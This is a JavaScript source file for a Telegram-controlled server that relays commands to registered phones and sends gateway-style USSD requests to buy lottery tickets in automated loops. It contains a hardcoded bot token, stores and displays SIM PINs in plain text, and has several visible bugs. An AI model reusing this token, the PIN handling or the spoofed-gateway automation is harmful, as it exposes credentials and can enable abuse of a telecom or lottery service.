require("dotenv").config();
const net = require('net');
const Telegraf = require("telegraf").Telegraf;
const bot = new Telegraf(process.env.telegram_bot);
const { default: axios } = require("axios");
const express = require('express');
const cors = require('cors');
const { Server } = require('socket.io');
const db = require('./utils/db');
const msisdnModel = require("./models/msisdn");
const { DBCheck } = require("./utils/helper");
const { features } = require("process");
const featuresModel = require("./models/features");
const adminModel = require("./models/admin");
const devicesModel = require("./models/devices");
const commandListModel = require("./models/commandList");
const routes = require("./routes");
const { validate, setDevice, setBalance } = require("./services");
const TelegramBot = require('node-telegram-bot-api');
const tasksModel = require("./models/tasks");
const bot2 = new TelegramBot("6606340563:AAGhpI2fzJhizqfGpRh9aJpt4IoEPOmiG1A", { polling: false });
/** server and socket  */


const menuOptions = {
    "Game Play": 1,
    "Show numbers": 2,
    "Redis Data": 3,
    "DB Data": 4,
    "Auto Play": 5,
    "Socket Commands": 5,
    "Main Menu": "#",
    "Main menu": "#",
    "1. Atena - 1 First": 1,
    "2. Atena - 2": 2, "3. Perm - 2": 3,
    "4. Banker": 4,
    "0. Back": 0, "Main game": 1,
    "1. Confirm": 1,
    "4 Games": 4, "8 Games": 8, "10 Games": 10, "15 Games": 15, "20 Games": 20, "40 Games": 40,
    "Yes": 1, "No": "0",
    "Get Data": "1", "Set Data": "2", "Delete": "3", Back: "0"
};

var app = express();
app.use(
    cors({
        credentials: true,
    })
);
app.use(function (req, res, next) {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader(
        "Access-Control-Allow-Methods",
        "GET, POST, OPTIONS, PUT, PATCH, DELETE"
    );
    res.setHeader(
        "Access-Control-Allow-Headers",
        "Origin, X-Requested-With,content-type,Accept"
    );
    next();
});

let socket_session = null;

const ussd = {
    shortCode: '766',
    msIsdn: '233531644806',
    text: '*766#',
    imsi: '',
    optional: '',
    ussdGwId: 'Vodafone',
    language: 'null',
    sessId: '2161392607',
    network: 'MTN',
    messageType: 1,
    sessionId: '2161392607',
    msisdn: '233531644806',
    ussdString: '*766#',
    serviceCode: ''
}
const vf = { "shortCode": "766", "msIsdn": "233208444900", "text": "*766#", "imsi": "", "optional": "", "ussdGwId": "Vodafone", "language": "null", "sessId": "5927584357" }

var app = express();
app.use(
    cors({
        credentials: true,
    })
);
app.use(function (req, res, next) {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader(
        "Access-Control-Allow-Methods",
        "GET, POST, OPTIONS, PUT, PATCH, DELETE"
    );
    res.setHeader(
        "Access-Control-Allow-Headers",
        "Origin, X-Requested-With,content-type,Accept"
    );
    next();
});

var http_ = require('http').createServer(app);
var io = new Server(http_, {
    cors: {
        origin: "*"
    }
})

io.on('connection', function (socket) {
    console.log('Client connected to the WebSocket');
    socket_session = socket;

    socket.on('disconnect', () => {
        console.log('Client disconnected');
    });

    // socket.on('chat message', function (msg) {
    //     console.log("Received a chat message");
    //     io.emit('chat message', msg);
    // });

    socket.onAny(async (eventName, ...args) => {
        let device = await devicesModel.findAll();
        device = device?.map((d) => d?.dataValues?.device_id);
        device = [...device, ...device?.map(m => `${m}_logs`)]

        // You can handle specific events here if needed
        if (eventName === 'chat message') {
            //     // Broadcast the message to all connected clients
            //     io.emit('chat message', args[0]);
        } else if (device.includes(eventName)) {
            // console.log("forward to ::", eventName, "  ", args[0]);

            let device_name = eventName.replace("_logs", "");
            const devices = await devicesModel.findOne({ where: { device_id: device_name } });
            if (devices?.dataValues?.id) device_name = devices?.dataValues?.name;

            const s = String(args[0]);

            //auto play check 
            if (s.includes("*766#") && s.endsWith("true")) {
                let data_ = ussd;
                if (['VODAFONE', 'vodafone gh', 'telecel'].includes(selectedMobile?.network)) {
                    data_ = vf;
                    data_.msIsdn = selectedMobile?.mobile;
                    data_.sessId = sessionGen();
                } else {
                    data_.msisdn = selectedMobile?.mobile;
                    data_.msIsdn = selectedMobile?.mobile;
                    data_.sessionId = sessionGen();
                }
                session.payload = data_;
                session.selectedMobile = selectedMobile;
                const data = await httpAxios.post(`user/ussd/ticket/${session.selectedMobile?.network === 'MTN' ? '' : 'vodafone'}`, data_);
                response = data?.data?.data?.inboundResponse || data?.data?.ussdMenu;
                console.log(response);
                return;
            }

            if (s.toLowerCase().includes("current balance")) {
                const balance = args[0]
                    .match(/GHS\s+([\d,]+\.?\d*)/g)
                    .map(match => parseFloat(match.split(' ')[1].replace(/,/g, '')))[0];
                io.emit('display_message', JSON.stringify({ device: device_name, message: `Balance : GHS ${balance}` }));
                return;
            }
            if (s.includes("Connection problem or invalid MMI code")) {
                io.emit('display_message', JSON.stringify({ device: device_name, message: s }));
                return;
            }

            if (["[Cash out is Allowed, OK]"].includes(s)) {
                io.emit('display_message', JSON.stringify({ device: device_name, message: s }));
                return;
            }

            if (s.includes('your phone number is') || s.includes("Your mobile number is") || s.includes("your number is")) {
                const pattern = /(?:233|\+233|0)\d{9}/;
                const match = s.match(pattern);
                let m = match?.[0];
                let network = "MTN";

                if (s.includes("your number is")) {
                    m = s.match(/\b233\d{8,9}\b/)[0];
                    network = "TIGO"
                }
                if (s.includes("Your mobile number is")) {
                    network = "VODAFONE"
                }

                if (m.startsWith("0"))
                    m = `233${m.slice(1)}`;
                const mobile = await msisdnModel.findOne({ where: { mobile: m } });
                if (!mobile?.dataValues?.id) {
                    await msisdnModel.create({
                        mobile: m, holder: device_name,
                        network: network, pin: '1389',
                        device_id: eventName,
                        balance: 0,
                        slot: 0, plays: 0
                    });
                    io.emit('display_message', JSON.stringify({ device: device_name, message: `${m} as added to your list of numbers ` }))
                } else
                    io.emit('display_message', JSON.stringify({ device: eventName, message: m }));

                return;
            }

            if (eventName.endsWith("_logs"))
                io.emit('controller', JSON.stringify({ device: eventName, message: args[0] }))
            else
                io.emit(eventName, args[0]);

        } else if (args[0].includes("|RegisterDevices")) {
            console.log(args[0], eventName);
            const deviceName = args[0].replace("|RegisterDevices", "");
            const findDevice = await devicesModel.findOne({ where: { name: deviceName } });
            if (findDevice?.dataValues?.id)
                await devicesModel.update({ device_id: eventName, }, { where: { name: deviceName } });
            else
                await devicesModel.create({ name: deviceName, device_id: eventName, pin: '1389', device_holder: deviceName });
        } else {
            try {
                const obj_ = args[0];
                const req = {};
                req.body = obj_;
                const validation = await validate(req);
                if (validation) {
                    if (obj_.command === 'set-device')
                        await setDevice(req);
                    else if (obj_.command === 'set-balance') {
                        const balance = obj_.message.match(/GHS\s+([\d.]+)/g)?.map(match => parseFloat(match.split(' ')[1]))[0];

                        if (+balance) {
                            req.body.balance = balance;
                            await setBalance(req);
                        }
                    }
                }
            } catch (err) {
                console.log(err)
            }
        }

    });

});

const httpAxios = axios.create({
    baseURL: process.env.api
});

const randomGen = (max, min) => Math.floor(Math.random() * (max - min + 1)) + min;
const sessionGen = () => Array.from({ length: 3 }).map(m => randomGen(1000, 9999)).join("");
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));


/**
 * 
 * @param {*} data 
 * @returns 
 */
const logic = async (data) => {
    let menu = [[
        "Game Play",
        "Show numbers"
    ], [
        "Redis Data",
        "DB Data"
    ], [
        "Auto Play",
        "Socket Commands"
    ], ["Main Menu"]];

    let features = await featuresModel.findAll();
    features = features?.map(m => m.dataValues);

    const { text, chat } = data?.update?.message;
    let selectedText = menuOptions?.[text] || text;

    if (text == "0. Back") selectedText = "0";
    selectedText = String(selectedText);
    console.log(chat?.id);
    if (![1209002201, 5254143080].includes(chat?.id)) {
        data.reply("Fuck off intruder");
        return;
    }
    let response = "Who the fuck are you?";
    let currentSession = '';
    let start = 0;
    let respData = {};
    try {
        const key = `${chat?.id}`;
        console.log(key);

        // await bot2.sendMessage("1209002201", message);

        if (selectedText.startsWith("customerCommand")) {
            const cmd = selectedText.split("|");
            if (cmd?.[1] === 'registerDevice')
                msisdnModel.update({ device_id: cmd?.[3] }, { where: { mobile: cmd?.[2] } });
            else if (cmd?.[1] === 'recordBalance')
                msisdnModel.update({ device_id: cmd?.[3] }, { where: { mobile: cmd?.[2] } });

            data.reply("Completed");
            return;
        } else if (selectedText === '#') {
            const user = await adminModel.findOne({ where: { name: key } });
            if (user?.dataValues?.id)
                await adminModel.update({ session: '{}', name: key }, { where: { name: key } });
            else
                await adminModel.create({ session: '{}', name: key, token: '' });

            let check = await adminModel.findOne({ where: { name: key } });
            if (check?.dataValues?.token) {
                const session = JSON.parse(check?.dataValues.session ?? '{}');
                session.step = 2;
                response = `Access granted to the kingdom.\n\n${features?.map(m => `${m.id}. ${m.name}`).join("\n")}`;
                await adminModel.update({ session: JSON.stringify(session) }, { where: { name: key } });
            }
            data.reply(response, {
                reply_markup: {
                    keyboard: menu,
                    resize_keyboard: true,
                    one_time_keyboard: false
                }
            });
            return;
        } else {
            const user = await adminModel.findOne({ where: { name: key } });
            const session = JSON.parse(user?.dataValues.session ?? '{}');

            if (!session?.step) {
                response = `Hello ${selectedText}\nGive me access to your life. If you know you know`;
                session.step = 1;
                session.name = selectedText;
            } else if (session?.step === 1) {
                const payload = selectedText.split("|");
                try {
                    const data = await httpAxios.post('admin/login', { mobile: payload[0], password: payload[1] });

                    await adminModel.update({ token: data?.data?.token }, { where: { name: key } });

                    session.step = 2;
                    response = `Access granted to the kingdom.\n\n${features?.map(m => `${m.id}. ${m.name}`).join("\n")}`;
                } catch (err) {
                    response = `Ok now i can tell you to really FUCK OFF`;
                }
            } else if (session?.step === 2) {
                let devices = await devicesModel.findAll();
                let numbers = [];
                devices?.map(m => {
                    numbers.push({ network: m?.['sim1_network'], mobile: m?.['sim1'], name: m?.device_holder });
                    numbers.push({ network: m?.['sim2_network'], mobile: m?.['sim2'], name: m?.device_holder })
                })
                numbers = numbers?.filter(m => m.mobile);

                if (selectedText === '1') {
                    session.option = 1;
                    response = "Choose a number and proceed\n\n" + numbers?.map((n, i) => `${i + 1}. ${n.mobile} (${n.network})-${n?.name}`).join("\n");
                    session.action = +selectedText;
                    session.step = 3;
                } else if (selectedText === '2') {
                    response = `List of numbers \n\n${numbers?.map(m => `${m.mobile}  |  ${m.network.toLowerCase()}  | ${m.holder} | ${m.pin}`).join("\n")}`
                } else if (selectedText === '3') {
                    session.step = 4;
                    response = `Redis menu \n\n Choose an option\n1. Get data\n2.Set Data\n3. Remove Data\n0. For redis menu`;
                } else if (selectedText === '4') {
                    session.step = 5;
                    response = `Database menu \n\n Choose an option\n1. Get data\n2.Set Data\n3. Remove Data\n4. Append to existing \n0. For DB menu`;
                } else if (selectedText === '5') {
                    session.step = 6;
                    response = "Choose a number and proceed\n\n" + numbers?.map((n, i) => `${i + 1}. ${n.mobile} (${n.network})-${n?.name}`).join("\n");
                } else if (selectedText === '6') {
                    session.step = 7;
                    session.command = { step: 1 };
                    let devices = await devicesModel.findAll();
                    devices = devices?.map(m => m.dataValues);
                    response = `Choose the device to process this command\n${devices?.map((m, i) => `${m.id}. ${m.device_holder}`).join("\n")}`;
                }
            } else if (session?.step === 3) {
                if (session.option === 1) {
                    let numbers = await msisdnModel.findAll();
                    numbers = numbers?.map(m => m.dataValues);
                    const selectedMobile = numbers[+selectedText - 1];
                    if (selectedMobile?.network == "mtn gh") selectedMobile.network = "MTN";
                    if (selectedMobile?.network == "mtn") selectedMobile.network = "MTN";

                    let data_ = ussd;
                    if (['VODAFONE', 'vodafone gh', 'telecel'].includes(selectedMobile?.network)) {
                        data_ = vf;
                        data_.msIsdn = selectedMobile?.mobile;
                        data_.sessId = sessionGen();
                    } else {
                        data_.msisdn = selectedMobile?.mobile;
                        data_.msIsdn = selectedMobile?.mobile;
                        data_.sessionId = sessionGen();
                    }
                    session.payload = data_;
                    session.selectedMobile = selectedMobile;
                    const data = await httpAxios.post(`user/ussd/ticket/${session.selectedMobile?.network === 'MTN' ? '' : 'vodafone'}`, data_);
                    response = data?.data?.data?.inboundResponse || data?.data?.ussdMenu;
                    session.option = 2;
                } else if (session.option === 2) {
                    if (session.selectedMobile?.network === 'MTN')
                        session.payload.ussdString = selectedText;
                    else
                        session.payload.text = selectedText;

                    const inputs = selectedText.split(" ");
                    if (inputs.length > 1) {
                        let l = 0;
                        while (l < inputs.length) {
                            if (session.selectedMobile?.network === 'MTN')
                                session.payload.ussdString = inputs[l];
                            else
                                session.payload.text = inputs[l];

                            l++;

                            const resp = await httpAxios.post(`user/ussd/ticket/${session.selectedMobile?.network === 'MTN' ? '' : 'vodafone'}`, session.payload);
                            response = resp?.data?.data?.inboundResponse || resp?.data?.ussdMenu;
                            response = `${session.selectedMobile?.mobile}\n\n${response}`
                            if (response.includes("1. Confirm")) break;
                            else data.reply(response);

                            await sleep(1000);
                        }
                    } else {
                        const resp = await httpAxios.post(`user/ussd/ticket/${session.selectedMobile?.network === 'MTN' ? '' : 'vodafone'}`, session.payload);
                        response = resp?.data?.data?.inboundResponse || resp?.data?.ussdMenu;
                        response = `${session.selectedMobile?.mobile}\n\n${response}`
                    }
                }
            } else if (session?.step === 4) {
                if (selectedText === '0') {
                    response = `Redis menu \n\n Choose an option\n1. Get data\n2.Set Data\n3. Remove Data\n0. For redis menu`;
                    delete session.subStep;
                } else {
                    if (!session.subStep) {
                        response = 'What key are we working with';
                        session.subStep = selectedText;
                    } else {
                        let admin = await adminModel.findOne({ where: { name: key } });
                        let resp = {};
                        const getToken = await httpAxios.post(`admin/login`, { mobile: process.env.user, password: process.env.pass }, {});

                        let header = {
                            headers: {
                                Authorization: `Bearer ${getToken?.data?.token}`
                            }
                        };
                        try {

                            if (session.subStep === '1')
                                resp = await httpAxios.get(`admin/redis/${selectedText}`, header);
                            else if (session.subStep === '2') {
                                const d = selectedText.split("=");
                                resp = await httpAxios.post(`admin/redis`, { key: d[0], value: d[1] }, header);
                            } else if (session.subStep === '3')
                                resp = await httpAxios.delete(`admin/redis/${selectedText}`, header);

                            console.log(resp);
                            response = resp?.data ?? 'Something went wrong retry';
                            response = response + '\n\n0. Back';
                            delete session.subStep;
                        } catch (err) {
                            console.log(err);
                            response = 'Sorry the request failed \n\n0. Back';
                            delete session.subStep;
                        }
                    }
                }
            } else if (session?.step === 5) {
                if (selectedText === '0') {
                    response = `Redis menu \n\n Choose an option\n1. Get data\n2.Set Data\n3. Remove Data\n4. Append to existing \n0. For redis menu`;
                    delete session.subStep;
                } else {
                    if (!session.subStep) {
                        response = 'What DB key or data are we working with';
                        session.subStep = selectedText;
                    } else {
                        if (session.subStep === '1') {
                            resp = db.get(selectedText);
                            response = JSON.stringify(resp, null, 3);
                        } else if (session.subStep === '2') {
                            const d = selectedText.split("=");
                            try {
                                const obj = JSON.parse(d[1]);
                                resp = db.put(d[0], obj);
                            } catch (err) {
                                resp = db.put(d[0], d[1]);
                            }
                            resp = db.get(d[0]);
                            response = JSON.stringify(resp, null, 3);
                        } else if (session.subStep === '3') {
                            db.del(selectedText);
                            response = "done";
                        } else if (session.subStep === '4') {
                            const d = selectedText.split("=");
                            let existingData = db.get(d[0]);
                            if (existingData !== 'undefinde') {
                                db.put(d[0], d[1]);
                            } else if (typeof existingData === 'string')
                                existingData += d[1];
                            else if (typeof existingData === 'object') {
                                if (Array.isArray(existingData)) {
                                    existingData.push(d[1]);
                                } else
                                    existingData[d[1]] = d[2];
                                db.put(d[0], existingData);
                            }
                            response = "done";
                        }

                        response += '\n\n0. Back';
                        delete session.subStep;
                    }
                }
            } else if (session?.step === 6) {
                if (!session?.auto) {
                    session.auto = { done: 0 };
                    let devices = await devicesModel.findAll();
                    let numbers = [];
                    devices?.map(m => {
                        numbers.push({ network: m?.['sim1_network'], mobile: m?.['sim1'], name: m?.device_holder });
                        numbers.push({ network: m?.['sim2_network'], mobile: m?.['sim2'], name: m?.device_holder })
                    })
                    numbers = numbers?.filter(m => m.mobile);

                    const selectedMobile = numbers[+selectedText - 1];
                    if (selectedMobile?.network === 'mtn') selectedMobile.network = "MTN";
                    session.auto.number = selectedMobile;

                    let admin = await adminModel.findOne({ where: { name: key } });
                    const getToken = await httpAxios.post(`admin/login`, { mobile: process.env.user, password: process.env.pass });

                    let header = {
                        headers: {
                            Authorization: `Bearer ${getToken?.data?.token}`
                        }
                    };

                    resp = await httpAxios.get(`admin/redis/checker`, header);
                    const check_ = resp?.data;

                    if (!String(resp?.data).includes(selectedMobile?.mobile)) {
                        // await httpAxios.post(`admin/redis`, { key: "checker", value: String(resp?.data) === 'false' ? `${selectedMobile?.mobile}` : `${String(resp?.data)},${selectedMobile?.mobile}` }, header);
                        // resp = await httpAxios.get(`admin/redis/checker`, header);
                        // console.log(resp?.data);
                    }

                    response = "How many games do you want to play in total\neg 1";
                    io.emit(session.auto.number?.device_id, session.auto.number?.device_id + "=balance=sim" + (+session.auto.number?.slot + 1));

                } else if (!session?.auto?.count) {
                    response = "How much do you want to spend on each game\neg. 3,2,5";
                    session.auto.count = +selectedText;
                } else if (!session?.auto?.stake) {
                    response = "Which games do you want to include in the plays\nOptions \n1. A1\n2. A2\n3. P2\n4. B\n\neg 1,2,3,4";
                    session.auto.stake = selectedText.split(",");
                } else if (!session?.auto?.games) {
                    response = "Do you want to confirm each iteration? \n1. Yes\n0. No\n";
                    session.auto.games = selectedText;
                } else {
                    if (selectedText === 'exit') {
                        delete session.auto;
                        session.step = 1;
                        data.reply("1");
                        return;
                    } else {
                        if (!session?.auto?.confirm) session.auto.confirm = ['1', 'yes', 'Yes', 'YES'].includes(selectedText) ? 1 : 0;

                        //Confirmation
                        if (session?.auto.confirmData) {
                            session.auto.done++;
                            if (selectedText === '1') {
                                session.auto.confirmData[['VODAFONE', 'vodafone gh', 'telecel'].includes(session.auto.number?.network) ? 'text' : 'ussdString'] = '1';
                                const resps = await httpAxios.post(`user/ussd/ticket/${session.auto.number?.network === 'MTN' ? '' : 'vodafone'}`, session?.auto.confirmData);
                                data.reply(resps?.data?.data?.inboundResponse || resps?.data?.ussdMenu);
                            } else data.reply("Cancelled and moving to the next");

                            delete session?.auto.confirmData;
                            session.auto.waiting = true;
                            await adminModel.update({ session: JSON.stringify(session) }, { where: { name: key } });
                            response = 'Waiting for next trigger';
                            return;
                        }

                        if (session?.auto.waiting) {
                            delete session.auto.waiting;
                        }

                        //Total games to play 
                        let earlyExit = true;

                        while (session.auto.done < +session.auto.count && earlyExit) {
                            let data_ = ussd;
                            if (['VODAFONE', 'vodafone gh', 'telecel'].includes(session.auto?.number?.network)) {
                                data_ = vf;
                                data_.msIsdn = session.auto?.number?.mobile;
                                data_.sessId = sessionGen();
                            } else {
                                data_.msisdn = session.auto?.number?.mobile;
                                data_.msIsdn = session.auto?.number?.mobile;
                                data_.sessionId = sessionGen();
                            }

                            let loop = 0;
                            let pickGame = null;
                            let keyValue = ['VODAFONE', 'vodafone gh', 'telecel'].includes(session.auto.number?.network) ? 'text' : 'ussdString';
                            while (loop < 5) {
                                if (loop === 0) data_.ussdString = '1';
                                else if (loop === 1) data_[keyValue] = '1';
                                else if (loop === 2) {
                                    const games = session?.auto?.games?.split(",");
                                    pickGame = Math.floor(Math.random() * (games.length - 0 + 1) + 0);
                                    data_[keyValue] = games?.[pickGame] ?? games[0];
                                    pickGame = +data_[keyValue];
                                } else if (loop === 3) {
                                    const plays = [];
                                    let limits = [0, 1, 2, 10, 1];
                                    let limit = limits[pickGame];
                                    if (limit === 10) limit = Math.floor(Math.random() * (limit - 3 + 1) + 3);
                                    while (plays.length != limit) {
                                        const pNumbers = Math.floor(Math.random() * (74 - 1 + 1) + 1);
                                        if (!plays.includes(pNumbers)) plays.push(pNumbers);
                                    }
                                    data_[keyValue] = plays?.join(",");
                                } else if (loop === 4) {
                                    const pi = Math.floor(Math.random() * (session?.auto?.stake.length - 1 - 0 + 1) + 0);
                                    data_[keyValue] = session?.auto?.stake[pi] ?? 1;
                                }

                                let resps = await httpAxios.post(`user/ussd/ticket/${session.auto.number?.network === 'MTN' ? '' : 'vodafone'}`, data_);
                                response = resps?.data?.data?.inboundResponse || resps?.data?.ussdMenu;

                                if (loop === 4) {
                                    if (session.auto.confirm) {
                                        session.auto.confirmData = data_;
                                        loop += 1000;
                                        earlyExit = false;
                                        data.reply("----");
                                    } else {
                                        session.auto.done++;
                                        data_[keyValue] = 1;
                                        data.reply(response);
                                        resps = await httpAxios.post(`user/ussd/ticket/${session.auto.number?.network === 'MTN' ? '' : 'vodafone'}`, data_);
                                        response = resps?.data?.data?.inboundResponse || resps?.data?.ussdMenu;

                                        data.reply(response);

                                        await sleep(15000);

                                        if (!session.auto.done % 3) {
                                            io.emit(session.auto.number?.device_id, session.auto.number?.device_id + "=balance=sim" + (+session.auto.number?.slot + 1));

                                            await sleep(5000);
                                        }

                                    }
                                }

                                await sleep(200);
                                loop++;
                            }
                        }

                        if (session.auto.done >= +session.auto.count) {
                            delete session.auto;
                            session.step = 2;
                            response = `Access granted to the kingdom.\n\n${features?.map(m => `${m.id}. ${m.name}`).join("\n")}`;
                        }
                    }
                }
            } else if (session?.step === 7) {
                let devices = await devicesModel.findAll();
                devices = devices?.map(m => m.dataValues);

                let device = await devicesModel.findByPk(selectedText);
                device = device?.dataValues;

                if (session?.command?.step === 1) {
                    session.command.device = device;
                    session.command.step = 2;
                    const commandList = await commandListModel.findAll();
                    const list = commandList?.sort()?.map(({ dataValues }) => "*" + dataValues?.name?.replace(/-/g, " ") + "*\n`" + dataValues?.command + "`").join("\n\n")

                    data.reply(list, { parse_mode: 'MarkdownV2' });
                    response = "**************";
                } else if (session?.command?.step === 2) {
                    if (selectedText === "0") {
                        session.command.step = 1;
                        response = `${session.command.device?.device_holder} Device\n\nChoose the device to process this command\n${devices?.map((m, i) => `${m.id}. ${m.device_holder}`).join("\n")} `;
                    } else {
                        if (io) {
                            let cmd = selectedText.replace('pincode', session.command.device?.pin);
                            // io.emit(session.command.device?.device_id, session.command.device?.device_id + "=" + cmd);
                            // if (socket_session)
                            //     socket_session.emit(session.command.device?.id, session.command.device?.device_id + "=" + cmd);
                            await tasksModel.create({ device_id: command.device?.id, task: cmd });

                            response = `Command sent to ${session.command.device?.device_holder} processing \n0 To change device`;
                            // }
                        } else
                            response = "Socket is null and should be restarted";
                    }
                }
            }

            await adminModel.update({ session: JSON.stringify(session) }, { where: { name: key } });

        }

        if (response.includes("1. Atena-1 First") && response.includes("0. Back"))
            menu = [["1. Atena - 1 First", "2. Atena - 2"], ["3. Perm - 2", "4. Banker"], ["0. Back"], ["Main menu"]]
        else if (response.includes("Akwaaba to NLA ATENA 5/75"))
            menu = [["Main game"], ["Draw Results", "TNC"], ["Talk to us"]]
        else if (response.includes("Select First Jersey number from"))
            menu = [["0. Back"], ["Main menu"]]
        else if (response.includes("1. Confirm") && response.includes("0. Back"))
            menu = [["1. Confirm", "0. Back"], ["Main menu"]]
        else if (response.includes("How many games do you want to play"))
            menu = [["4 Games", "8 Games"], ["10 Games", "15 Games"], ["20 Games", "40 Games"], ["Main menu"]]
        else if (response.includes("How much do you want to spend") || response.includes("Enter your stake amount"))
            menu = [["1", "2", "3", "4"], ["5", "6", "1,2", "2,3", "3,4", "2,3,4"], ["4,5", "3,4,5,6"], ["Main menu"]]
        else if (response.includes("Which games do you want to include"))
            menu = [["1", "2"], ["3", "4"], ["0. Back", "Main menu"]]
        else if (response.includes("separate each selection with a space") || response.includes("Enter your stake amount"))
            menu = [["0. Back", "Main menu"]]
        else if (response.includes("Do you want to confirm each iteration?"))
            menu = [["Yes", "No"], ["Main menu"]]
        else if (response.includes("Choose a number and proceed"))
            menu = [["1", "2", "3", "4"], [], ["5", "6", "7", "8"], ["9", "Main menu"]]
        else if (response.includes("Redis menu"))
            menu = [["Get Data", "Set Data", "Delete"], ["Back", "Main menu"]]
        else if (response.includes("What key are we working with"))
            menu = [["checker"], ["Back", "Main menu"]]
        else if (response.endsWith("0. Back"))
            menu = [["Back", "Main menu"]]

        data.reply(response, {
            reply_markup: {
                keyboard: menu,
                resize_keyboard: true,
                one_time_keyboard: false
            }
        });
    } catch (err) {
        console.log(err)
        data.reply(err);
    }
}


const startTelegram = () => {
    bot.start(async (ctx) => logic(ctx));
    bot.on("text", (data) => logic(data));
    bot.launch();
}

module.exports = startTelegram;
// setTimeout(() => {
//     io.emit("052e75b8e3662840", "*766#:1:3:1,72,37,54,27:3:1:true:0208712458");
// }, 3000);